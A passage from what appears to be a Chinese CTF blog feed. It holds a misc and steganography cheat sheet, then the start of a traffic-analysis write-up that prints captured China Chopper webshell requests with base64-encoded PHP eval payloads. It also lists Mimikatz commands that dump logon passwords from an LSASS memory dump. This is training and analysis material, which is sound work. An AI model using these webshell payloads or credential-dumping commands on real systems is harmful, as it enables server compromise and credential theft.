class="line">steady@steady:~/桌面/tools/stegoVeritas-master/stegoveritas$ mediainfo /home/steady/桌面/tools/music.wav</span><br><span class="line">General</span><br><span class="line">Complete name                            : /home/steady/桌面/tools/music.wav</span><br><span class="line">Format                                   : Wave</span><br><span class="line">File size                                : <span class="number">313</span> KiB</span><br><span class="line">Duration                                 : <span class="number">20</span> s <span class="number">0</span> ms</span><br><span class="line">Overall bit rate mode                    : Constant</span><br><span class="line">Overall bit rate                         : <span class="number">128</span> kb/s</span><br><span class="line"></span><br><span class="line">Audio</span><br><span class="line">Format                                   : PCM</span><br><span class="line">Format settings                          : Little / Signed</span><br><span class="line">Codec ID                                 : <span class="number">1</span></span><br><span class="line">Duration                                 : <span class="number">20</span> s <span class="number">0</span> ms</span><br><span class="line">Bit rate mode                            : Constant</span><br><span class="line">Bit rate                                 : <span class="number">128</span> kb/s</span><br><span class="line">Channel(s)                               : <span class="number">1</span> channel</span><br><span class="line">Sampling rate                            : <span class="number">8</span> <span class="number">000</span> Hz</span><br><span class="line">Bit depth                                : <span class="number">16</span> bits</span><br><span class="line">Stream size                              : <span class="number">312</span> KiB (<span class="number">100</span>%)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Steganography"><a href="#Steganography" class="headerlink" title="Steganography"></a>Steganography</h3><p>音频lsb</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;.local&#x2F;bin$ &#x2F;home&#x2F;steady&#x2F;.local&#x2F;bin&#x2F;stegolsb wavsteg </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python WavSteg.py -r -s 咻咻咻.wav -o output -n <span class="number">1</span> -b <span class="number">1000</span> &amp;&amp; cat output</span><br></pre></td></tr></table></figure><h3 id="morse2ascii"><a href="#morse2ascii" class="headerlink" title="morse2ascii"></a>morse2ascii</h3><p>使用au软件，将音频文件导出为wav文件。(前提是能分离立体声到单声道。)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ morse2ascii &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_BitcoinPay.png.extracted&#x2F;4.wav</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/45.png" alt="45"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ morse2ascii &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_BitcoinPay.png.extracted&#x2F;4.wav</span><br><span class="line"></span><br><span class="line">MORSE2ASCII 0.2</span><br><span class="line">by Luigi Auriemma</span><br><span class="line">e-mail: aluigi@autistici.org</span><br><span class="line">web:    aluigi.org</span><br><span class="line"></span><br><span class="line">- open &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_BitcoinPay.png.extracted&#x2F;4.wav</span><br><span class="line">  wave size      1025374</span><br><span class="line">  format tag     1</span><br><span class="line">  channels:      1</span><br><span class="line">  samples&#x2F;sec:   8000</span><br><span class="line">  avg&#x2F;bytes&#x2F;sec: 16000</span><br><span class="line">  block align:   2</span><br><span class="line">  bits:          16</span><br><span class="line">  samples:       512687</span><br><span class="line">  bias adjust:   43</span><br><span class="line">  volume peaks:  -2486 2487</span><br><span class="line">  normalize:     30280</span><br><span class="line">  resampling to  8000hz</span><br><span class="line"></span><br><span class="line">- decoded morse data:</span><br><span class="line">f029bd6f551139eedeb8e45a175b0786  f029bd6f5</span><br></pre></td></tr></table></figure><h2 id="strings命令"><a href="#strings命令" class="headerlink" title="strings命令"></a>strings命令</h2><p>使用strings命令查看当前文件夹所有文件内容并截取敏感字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings * | grep &quot;flag&quot;</span><br></pre></td></tr></table></figure><p>使用strings命令查看指定文件夹中的文件的所有内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;flag&quot; -r &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;眼见非实</span><br></pre></td></tr></table></figure><p>快速查看jpg有无属性信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings misc2.jpg | grep &quot;?xpacket&quot;</span><br></pre></td></tr></table></figure><h2 id="word文档"><a href="#word文档" class="headerlink" title="word文档"></a>word文档</h2><h3 id="改变文字颜色"><a href="#改变文字颜色" class="headerlink" title="改变文字颜色"></a>改变文字颜色</h3><h3 id="取消隐藏文字"><a href="#取消隐藏文字" class="headerlink" title="取消隐藏文字"></a>取消隐藏文字</h3><p>选项–&gt;视图–&gt;隐藏文字。</p><h2 id="01editor"><a href="#01editor" class="headerlink" title="01editor"></a>01editor</h2><h3 id="翻转十六进制"><a href="#翻转十六进制" class="headerlink" title="翻转十六进制"></a>翻转十六进制</h3><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/14.png" alt="14"></p><h2 id="GIF图片"><a href="#GIF图片" class="headerlink" title="GIF图片"></a>GIF图片</h2><h3 id="图片分帧"><a href="#图片分帧" class="headerlink" title="图片分帧"></a>图片分帧</h3><p>Python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#分离gif.py</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">savepath = <span class="string">&quot;C:/Users/12521/flag/&quot;</span> <span class="comment">#保存路径</span></span><br><span class="line"></span><br><span class="line">im = Image.open(<span class="string">&#x27;1.gif&#x27;</span>)   <span class="comment">#从文件加载图像</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    im.save(savepath+<span class="string">&#x27;&#123;:d&#125;.png&#x27;</span>.format(im.tell())) <span class="comment">#读取每一帧</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        im.seek(im.tell()+<span class="number">1</span>) <span class="comment">#在不同帧之间移动</span></span><br><span class="line">        im.save(savepath+<span class="string">&#x27;&#123;:d&#125;.png&#x27;</span>.format(im.tell()))  <span class="comment">#保存文件</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>GIF分帧工具</p><p><code>GifSplitter.exe</code></p><p>kali分帧工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert flag.gif flag.png</span><br></pre></td></tr></table></figure><h3 id="图片合并"><a href="#图片合并" class="headerlink" title="图片合并"></a>图片合并</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt <span class="comment">#</span></span><br><span class="line">res = Image.new(<span class="string">&#x27;RGBA&#x27;</span>,(<span class="number">402</span>,<span class="number">600</span>)) </span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">201</span>): </span><br><span class="line">filename = <span class="string">f&quot;./flag/<span class="subst">&#123;x&#125;</span>.png&quot;</span> </span><br><span class="line">print(filename) </span><br><span class="line">tmp = Image.open(filename)</span><br><span class="line">res.paste(tmp,(x*<span class="number">2</span>,<span class="number">0</span>))</span><br><span class="line">plt.imshow(res) </span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#拼接图像.py</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">path = <span class="string">&quot;C:/Users/12521/flag/&quot;</span></span><br><span class="line">save_path = <span class="string">&#x27;C:/Users/12521/&#x27;</span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">&#x27;RGBA&#x27;</span>,(<span class="number">2</span>*<span class="number">201</span>,<span class="number">600</span>)) <span class="comment">#创建新照片</span></span><br><span class="line">imagefile = [] <span class="comment">#存储所有的图像的名称</span></span><br><span class="line">width = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">201</span>):</span><br><span class="line">    imagefile.append(Image.open(path+str(i)+<span class="string">&#x27;.png&#x27;</span>)) <span class="comment">#遍历，将图像名称存入imagfile</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> image <span class="keyword">in</span> imagefile:</span><br><span class="line">    im.paste(image,(width,<span class="number">0</span>,<span class="number">2</span>+width,<span class="number">600</span>)) <span class="comment">#将图片张贴到另一张图片上</span></span><br><span class="line">    width = width +<span class="number">2</span> 别以<span class="number">7</span></span><br><span class="line">im.save(save_path+<span class="string">&#x27;steady.png&#x27;</span>)</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure><p>使用kali工具合并</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# montage flag*.png -tile x1 -geometry +0+0 flag.png</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-tile是拼接时每行和每列的图片数，这里用x1，就是只一行</span><br><span class="line">-geometry是首选每个图和边框尺寸，我们边框为0，图照原始尺寸即可。</span><br></pre></td></tr></table></figure><h3 id="每一帧的间隔时间"><a href="#每一帧的间隔时间" class="headerlink" title="每一帧的间隔时间"></a>每一帧的间隔时间</h3><p>通过<code>identify</code>命令清晰的打印出每一帧的时间间隔。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ identify -format <span class="string">&quot;%s %T \n&quot;</span> <span class="number">100.</span>gif</span><br><span class="line">第n帧 间隔时间</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;_key.ftm.extracted$ identify -verbose flag.gif | grep Delay</span><br></pre></td></tr></table></figure><h2 id="Python隐写"><a href="#Python隐写" class="headerlink" title="Python隐写"></a>Python隐写</h2><h3 id="unpy2exe"><a href="#unpy2exe" class="headerlink" title="unpy2exe"></a>unpy2exe</h3><p>编译文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unpy2exe.py -o calc calc.exe</span><br></pre></td></tr></table></figure><h3 id="uncompyle6"><a href="#uncompyle6" class="headerlink" title="uncompyle6"></a>uncompyle6</h3><p>拿到pyc文件使用工具得到py文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:/tmp/uncompyle6/bin$steady@steady:~$ /home/steady/桌面/tools/python-uncompyle6-master/bin/uncompyle6 /home/steady/桌面/steady/<span class="number">4.</span>pyc</span><br></pre></td></tr></table></figure><h3 id="stegosaurus"><a href="#stegosaurus" class="headerlink" title="stegosaurus"></a>stegosaurus</h3><p>使用工具解出藏有的flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:/tmp/stegosaurus$ ./stegosaurus -x /tmp/QAQ.pyc</span><br></pre></td></tr></table></figure><h3 id="python序列化内容的存入"><a href="#python序列化内容的存入" class="headerlink" title="python序列化内容的存入"></a>python序列化内容的存入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import pickle  </span><br><span class="line"></span><br><span class="line">fp &#x3D; open(&quot;2.txt&quot;,&quot;rb+&quot;)      &#39;&#39;&#39; 打开序列化文件 &#39;&#39;&#39;</span><br><span class="line">fw &#x3D; open(&#39;pickle.txt&#39;, &#39;w&#39;)  &#39;&#39;&#39; 打开保存文件 &#39;&#39;&#39;</span><br><span class="line">a&#x3D;pickle.load(fp)             &#39;&#39;&#39; 反序列化文件编译 &#39;&#39;&#39;</span><br><span class="line">pickle&#x3D;str(a)                 &#39;&#39;&#39; 转换成字符串要不然不能保存 &#39;&#39;&#39;</span><br><span class="line">fw.write( pickle )            &#39;&#39;&#39; 写入文件 &#39;&#39;&#39;</span><br><span class="line">fw.close()                    &#39;&#39;&#39; 关闭文件 &#39;&#39;&#39;</span><br><span class="line">fp.close()                    &#39;&#39;&#39; 关闭文件 &#39;&#39;&#39;</span><br></pre></td></tr></table></figure><h2 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h2><h3 id="合并文件"><a href="#合并文件" class="headerlink" title="合并文件"></a>合并文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy &#x2F;B 文件1+文件2+... 合并文件名.rar</span><br></pre></td></tr></table></figure><h3 id="生成十六进制"><a href="#生成十六进制" class="headerlink" title="生成十六进制"></a>生成十六进制</h3><p><code>xxd</code>命令生成一个hex文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -p -r 文件 hex</span><br></pre></td></tr></table></figure><h2 id="base64隐写"><a href="#base64隐写" class="headerlink" title="base64隐写"></a>base64隐写</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">→  ~ b64steg.py -f stego.txt -s output.txt</span><br><span class="line">Base_sixty_four_point_five</span><br></pre></td></tr></table></figure><h2 id="excle"><a href="#excle" class="headerlink" title="excle"></a>excle</h2><p>修改后缀为rar</p><p><code>strings</code>直接搜索flag。</p><h2 id="word、ppt"><a href="#word、ppt" class="headerlink" title="word、ppt"></a>word、ppt</h2><p>直接搜索flag，修改颜色。</p><p>转换为zip，或者zip转换doc。</p><p>doc如果打不开，尝试放入winhex，将某处改为FF。</p><p>使用工具破解密码，<code>AccentOPR.CracKed.By.Hmily[LCG][LSG]</code>。</p><p>ppt也可以改变颜色，拿到隐藏的文字。</p><p>如果文字复制不了需要先格式刷</p><h2 id="vmdk"><a href="#vmdk" class="headerlink" title="vmdk"></a>vmdk</h2><p>拿到这个文件，可以先使用7z当作压缩包打开。</p><p>其次对.fat文件进行挂载。</p><h2 id="迷你卡兹"><a href="#迷你卡兹" class="headerlink" title="迷你卡兹"></a>迷你卡兹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure><h2 id="xortool"><a href="#xortool" class="headerlink" title="xortool"></a>xortool</h2><p>猜测xor加密的密码长度以值(key)</p><p>使用方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xortool (-x) -c 20 123.txt</span><br><span class="line">#-x：代表文件内容为十六进制</span><br><span class="line">#-c：后加出现频率最高的字符，文本内容一般是空格（20），二进制文件一般是00</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ /home/steady/.local/bin/xortool  -c <span class="number">20</span> /home/steady/桌面/steady/badd3e0621ff43de8cf802545bbd3ed0</span><br><span class="line">The most probable key lengths:</span><br><span class="line"> <span class="number">2</span>:  <span class="number">12.2</span>%</span><br><span class="line"> <span class="number">5</span>:  <span class="number">11.9</span>%</span><br><span class="line"> <span class="number">9</span>:   <span class="number">9.8</span>%</span><br><span class="line"><span class="number">13</span>:  <span class="number">22.2</span>%</span><br><span class="line"><span class="number">20</span>:   <span class="number">6.8</span>%</span><br><span class="line"><span class="number">22</span>:   <span class="number">6.2</span>%</span><br><span class="line"><span class="number">26</span>:  <span class="number">12.8</span>%</span><br><span class="line"><span class="number">30</span>:   <span class="number">4.6</span>%</span><br><span class="line"><span class="number">39</span>:   <span class="number">7.8</span>%</span><br><span class="line"><span class="number">52</span>:   <span class="number">5.7</span>%</span><br><span class="line">Key-length can be <span class="number">3</span>*n</span><br><span class="line"><span class="number">1</span> <span class="function">possible <span class="title">key</span><span class="params">(s)</span> of length 13:</span></span><br><span class="line">Good\tuckToYou</span><br><span class="line">Found <span class="number">1</span> plaintexts with <span class="number">95</span>%+ valid characters</span><br><span class="line">See files filename-key.csv, filename-char_used-perc_valid.csv</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="PDF隐写"><a href="#PDF隐写" class="headerlink" title="PDF隐写"></a>PDF隐写</h3><p> wbStego4.3open</p><h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p>1、任何文件都可以尝试一下ntfs隐写，不要在过于在意压缩包中的图片，有时候压缩包也可能存在ntfs隐写。</p><p>2、图片如果在win下可以正常访问，但是在linux无法访问，一定要尝试crc爆破，修改高度。</p><p>3、jpg、png图片都可以修改高度和宽度。</p><p>4、遇到jpg文件多查看一下文件属性。</p><p>5、遇到图片使用strings查看一下有没有敏感字符。</p><p>6、jpg图片藏有一下信息，属性中一定有信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;x:xmpmeta xmlns:x&#x3D;&quot;adobe:ns:meta&#x2F;&quot;&gt;&lt;rdf:RDF xmlns:rdf&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;02&#x2F;22-rdf-syntax-ns#&quot;&#x2F;&gt;&lt;&#x2F;x:xmpmeta&gt;</span><br></pre></td></tr></table></figure><p>7、压缩包crc爆破一定要搞清楚文件原始大小是多少，使用bandzip查看。</p><p>8、zip可以改doc，同样doc也可以改zip。</p><p>9、如果拿到许多文件，肯定有特殊的文件，如果存在于zip中，则要看一看CRC是不是一样。</p><p>10、任何i都要把流程走一遍，比如binwalk。</p><p>11、拿到二进制先判断数量如果能开放，可以尝试转化为二维码。如果是八的倍数，尝试八个一组转换为二进制。也可以转换成摩斯密码。</p><p>12、如果一个文件提示flag不在这里，呢么很可能这个文件还藏有另一个文件，就是ntfs隐写，7z可以看到是否存在隐写流。</p><p>13、<code>vmdk</code>文件可以用7z解压。</p><p>14、如果有十六进制文件，直接使用01的导入十六进制功能。</p><p>15、拿到一个exe文件可以先尝试运行。</p><p>16、可以使用<code>strings</code>命令来查看是否存在ntfs。</p><p>17、base32解密一定要注意后面的等号个数。</p><p>16、多个文件，一定要注意下多个文件的修改日期、大小、md5等。找到不同的呢个一个。</p><p>17、一个字符串，判断长度。是否是3、8、2的倍数，3的倍数，八进制。2的倍数十六进制。8的倍数二进制八个一组。是否大于128，大于128减去128转换字符串。</p><p>18、看到<code>63、255、127、191</code>，ttl隐写</p><p>19、关于二进制，有时候可以逆序、八位逆序。</p><p>20、数字有重复的话，手机九键盘。</p><p>21、明文攻击一定要使用winrar先进行压缩。如果出现提示：一个文档必须只有一个文件。说明没有用winrar进行压缩。</p><p>22、mp4也可以使用<code>exiftool powpow.mp4</code></p><p>23、zsteg也可以检测bmp。</p>]]></content>
      
      
      <categories>
          
          <category> CTF-杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-杂项 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-流量分析题1</title>
      <link href="2019/05/08/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%981/"/>
      <url>2019/05/08/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%981/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-流量分析题1"><a href="#CTF-流量分析题1" class="headerlink" title="CTF-流量分析题1"></a>CTF-流量分析题1</h1><h2 id="Chopper"><a href="#Chopper" class="headerlink" title="Chopper"></a>Chopper</h2><p>开文件追踪TCP</p><p>第一个包是连接shell的流量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /isg.php HTTP/<span class="number">1.1</span></span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">X-Forwarded-<span class="keyword">For</span>: <span class="number">10.197</span><span class="number">.194</span><span class="number">.76</span></span><br><span class="line">Referer: http:<span class="comment">//192.168.1.10</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/<span class="number">4.0</span> (compatible; MSIE <span class="number">6.0</span>; Windows NT <span class="number">5.1</span>)</span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.1</span><span class="number">.10</span></span><br><span class="line">Content-Length: <span class="number">692</span></span><br><span class="line">Connection: Close</span><br><span class="line"></span><br><span class="line">ISG2014=%<span class="number">40</span><span class="keyword">eval</span>%<span class="number">01</span>%<span class="number">28</span>base64_decode%<span class="number">28</span>%<span class="number">24</span>_POST%<span class="number">5</span>Bz0%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">29</span>%<span class="number">3</span>B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%<span class="number">2</span>BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%<span class="number">3</span>D%<span class="number">3</span>DHTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Sun, <span class="number">07</span> Sep <span class="number">2014</span> <span class="number">16</span>:<span class="number">34</span>:<span class="number">08</span> GMT</span><br><span class="line">Server: Apache/<span class="number">2.2</span><span class="number">.15</span> (CentOS)</span><br><span class="line">X-Powered-By: PHP/<span class="number">5.3</span><span class="number">.3</span></span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: <span class="number">110</span></span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF<span class="number">-8</span></span><br><span class="line"></span><br><span class="line">-&gt;|/<span class="keyword">var</span>/www/htmlLinux Linux <span class="number">2.6</span><span class="number">.32</span><span class="number">-431.23</span><span class="number">.3</span>.el6.x86_64 <span class="comment">#1 SMP Thu Jul 31 17:20:51 UTC 2014 x86_64(apache)|&lt;-</span></span><br></pre></td></tr></table></figure><p>第二个包是列目录的操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;isg.php HTTP&#x2F;1.1</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">X-Forwarded-For: 10.197.194.76</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.1.10</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 6.0; Windows NT 5.1)</span><br><span class="line">Host: 192.168.1.10</span><br><span class="line">Content-Length: 734</span><br><span class="line">Connection: Close</span><br><span class="line"></span><br><span class="line">ISG2014&#x3D;%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0&#x3D;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1&#x3D;L3Zhci93d3cvaHRtbC8%3DHTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Sun, 07 Sep 2014 16:34:08 GMT</span><br><span class="line">Server: Apache&#x2F;2.2.15 (CentOS)</span><br><span class="line">X-Powered-By: PHP&#x2F;5.3.3</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 295</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line"></span><br><span class="line">-&gt;|..&#x2F;2014-09-08 00:08:1340960755</span><br><span class="line">css&#x2F;2014-09-08 00:27:5540960755</span><br><span class="line">.&#x2F;2014-09-08 00:28:3340960755</span><br><span class="line">images&#x2F;2014-09-08 00:27:5840960755</span><br><span class="line">upload&#x2F;2014-09-08 00:28:3340960755</span><br><span class="line">isg.php2014-09-05 23:04:00340644</span><br><span class="line">index.php2014-09-08 00:27:4800644</span><br><span class="line">x.tar.gz2014-09-08 00:17:541740644</span><br><span 